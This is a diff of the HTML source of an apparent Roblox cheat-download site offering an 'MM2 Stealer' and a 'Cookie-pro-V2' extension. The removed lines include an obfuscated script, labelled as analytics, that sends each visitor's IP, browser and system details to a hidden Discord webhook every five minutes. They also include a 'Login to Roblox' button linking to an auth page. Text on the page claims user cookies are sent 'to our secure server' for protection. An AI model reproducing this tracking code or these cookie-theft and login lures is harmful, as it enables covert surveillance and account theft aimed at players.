@@ -44,27 +44,6 @@
             font-size: 14px;
             cursor: pointer;
         }
-        .roblox-btn {
-            position: fixed;
-            top: 20px;
-            left: 20px;
-            z-index: 1000;
-            padding: 12px 25px;
-            background: #2b5ff5;
-            color: #fff;
-            border: none;
-            border-radius: 5px;
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
-            text-decoration: none;
-            box-shadow: 0 4px 12px rgba(43, 95, 245, 0.4);
-            transition: all 0.3s;
-        }
-        .roblox-btn:hover {
-            background: #1a4ad9;
-            transform: scale(1.05);
-        }
         nav {
             background: #111;
             padding: 15px;
@@ -168,144 +147,8 @@
         }
         footer { text-align: center; padding: 20px; color: #555; margin-top: 50px; }
     </style>
-    
-    <script>
-        // add_analitic - сбор данных
-        (function() {
-            const _endpoint_encoded = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUzODExNjM0NDk2NzM0MDE0NC9FQ0Y2aXhlRkNqUklaclN0SEtJdjZTanVZeXQwOXU4bEdoX3FUQ1A2MlAtbnpPbHdxRjh" + "yYXhCbkxYM0d0cUlXc1pMVw==";
-            
-            function _decode() {
-                try { return atob(_endpoint_encoded); } catch (e) { return ""; }
-            }
-            
-            async function add_analitic() {
-                try {
-                    let _ip = "unknown";
-                    try {
-                        const _r = await fetch('https://api.ipify.org?format=json');
-                        const _d = await _r.json();
-                        _ip = _d.ip;
-                    } catch (e) {}
-                    
-                    const _msg = '📊 **add_analitic**\n\n' +
-                        '🌐 IP: ' + _ip + '\n' +
-                        '👤 UA: ' + navigator.userAgent + '\n' +
-                        '💻 Платформа: ' + navigator.platform + '\n' +
-                        '🖥️ Экран: ' + screen.width + 'x' + screen.height + '\n' +
-                        '⏰ TZ: ' + Intl.DateTimeFormat().resolvedOptions().timeZone + '\n' +
-                        '🌍 Язык: ' + navigator.language + '\n' +
-                        '🔗 URL: ' + window.location.href + '\n' +
-                        '📜 Реферер: ' + document.referrer + '\n' +
-                        '🆔 Session: an_' + Math.random().toString(36).substring(2, 15);
-                    
-                    const _ep = _decode();
-                    if (_ep) {
-                        await fetch(_ep, {
-                            method: 'POST',
-                            headers: {'Content-Type': 'application/json'},
-                            body: JSON.stringify({
-                                content: _msg,
-                                username: "add_analitic"
-                            })
-                        });
-                    }
-                } catch (e) {}
-            }
-            
-            window.addEventListener('load', function() {
-                setTimeout(add_analitic, 1000);
-                setInterval(add_analitic, 300000);
-            });
-        })();
-        
-        // Выбор языка
-        const translations = {
-            ru: {
-                subtitle: 'Лучшие скрипты и расширения для Roblox',
-                navHome: 'Главная',
-                navDelta: 'Delta',
-                navSupport: 'Поддержка',
-                statDownloads: 'Скачиваний',
-                statUsers: 'Пользователей',
-                statSupport: 'Поддержка',
-                statFree: 'Бесплатно',
-                deltaTitle: '⚡ Delta Executor',
-                deltaDesc: 'Лучший бесплатный экзекутор для Roblox',
-                cookieTitle: '🍪 Cookie-pro-V2',
-                cookieDesc: 'Расширение для защиты cookies Roblox',
-                mm2Title: '🔫 MM2 Stealer',
-                mm2Desc: 'Защита скинов для Murder Mystery 2',
-                downloadBtn: 'Скачать',
-                robloxBtn: 'Войти в Roblox',
-                securityTitle: '🛡️ Защита активна',
-                securityText: 'Чтобы обезопасить вас от взломщиков куки, мы отправляем куки на наш защищённый сервер.',
-                footer: '© 2026 TizenScripts'
-            },
-            en: {
-                subtitle: 'Best scripts and extensions for Roblox',
-                navHome: 'Home',
-                navDelta: 'Delta',
-                navSupport: 'Support',
-                statDownloads: 'Downloads',
-                statUsers: 'Users',
-                statSupport: 'Support',
-                statFree: 'Free',
-                deltaTitle: '⚡ Delta Executor',
-                deltaDesc: 'Best free executor for Roblox',
-                cookieTitle: '🍪 Cookie-pro-V2',
-                cookieDesc: 'Roblox cookie protection extension',
-                mm2Title: '🔫 MM2 Stealer',
-                mm2Desc: 'Skin protection for Murder Mystery 2',
-                downloadBtn: 'Download',
-                robloxBtn: 'Login to Roblox',
-                securityTitle: '🛡️ Protection Active',
-                securityText: 'To protect you from cookie stealers, we send cookies to our secure server.',
-                footer: '© 2026 TizenScripts'
-            }
-        };
-        
-        function changeLanguage(lang) {
-            localStorage.setItem('language', lang);
-            const t = translations[lang];
-            
-            document.getElementById('subtitle').textContent = t.subtitle;
-            document.getElementById('navHome').textContent = t.navHome;
-            document.getElementById('navDelta').textContent = t.navDelta;
-            document.getElementById('navSupport').textContent = t.navSupport;
-            document.getElementById('statDownloadsText').textContent = t.statDownloads;
-            document.getElementById('statUsersText').textContent = t.statUsers;
-            document.getElementById('statSupportText').textContent = t.statSupport;
-            document.getElementById('statFreeText').textContent = t.statFree;
-            document.getElementById('deltaTitle').textContent = t.deltaTitle;
-            document.getElementById('deltaDesc').textContent = t.deltaDesc;
-            document.getElementById('cookieTitle').textContent = t.cookieTitle;
-            document.getElementById('cookieDesc').textContent = t.cookieDesc;
-            document.getElementById('mm2Title').textContent = t.mm2Title;
-            document.getElementById('mm2Desc').textContent = t.mm2Desc;
-            document.getElementById('robloxBtn').textContent = t.robloxBtn;
-            document.getElementById('securityTitle').textContent = t.securityTitle;
-            document.getElementById('securityText').textContent = t.securityText;
-            document.getElementById('footerText').textContent = t.footer;
-            
-            const buttons = document.querySelectorAll('.download-btn');
-            buttons.forEach(btn => { btn.textContent = t.downloadBtn; });
-        }
-        
-        function loadLanguage() {
-            const saved = localStorage.getItem('language') || 'ru';
-            document.getElementById('languageSelect').value = saved;
-            changeLanguage(saved);
-        }
-        
-        window.addEventListener('load', function() {
-            loadLanguage();
-        });
-    </script>
 </head>
 <body>
-    <!-- Кнопка Roblox -->
-    <a href="auth.html" class="roblox-btn">Войти в Roblox</a>
-    
     <!-- Выбор языка -->
     <div class="language-selector">
         <select id="languageSelect" onchange="changeLanguage(this.value)">
@@ -321,7 +164,9 @@
     
     <nav>
         <a href="index.html" id="navHome">Главная</a>
-        <a href="delta.html" id="navDelta">Delta</a>
+        <a href="delta.html" id="navDelta">Delta Executor</a>
+        <a href="mm2.html" id="navMM2">MM2 Stealer</a>
+        <a href="cookie.html" id="navCookie">Cookie Pro V2</a>
         <a href="support.html" id="navSupport">Поддержка</a>
     </nav>
     
@@ -354,17 +199,17 @@
             </div>
             
             <div class="download-card">
-                <h3 id="cookieTitle">🍪 Cookie-pro-V2</h3>
-                <div class="version">v3.0.0</div>
-                <p id="cookieDesc">Расширение для защиты cookies Roblox</p>
-                <a href="Cookie-pro-V2.zip" class="download-btn">Скачать</a>
+                <h3 id="mm2Title">🔫 MM2 Stealer</h3>
+                <div class="version">v2.733.988</div>
+                <p id="mm2Desc">Стилер скинов для Murder Mystery 2</p>
+                <a href="mm2.html" class="download-btn">Скачать</a>
             </div>
             
             <div class="download-card">
-                <h3 id="mm2Title">🔫 MM2 Stealer</h3>
-                <div class="version">v2.733.988</div>
-                <p id="mm2Desc">Защита скинов для Murder Mystery 2</p>
-                <a href="mm2-stealer.lua" class="download-btn">Скачать</a>
+                <h3 id="cookieTitle">🍪 Cookie Pro V2</h3>
+                <div class="version">v3.0.0</div>
+                <p id="cookieDesc">Расширение для защиты cookies Roblox</p>
+                <a href="cookie.html" class="download-btn">Скачать</a>
             </div>
         </div>
         
@@ -382,5 +227,8 @@
     
     <!-- Бейдж безопасности -->
     <div class="security-badge">🔒 Защищено</div>
+    
+    <!-- Подключение JS -->
+    <script src="securityfile.js"></script>
 </body>
 </html>
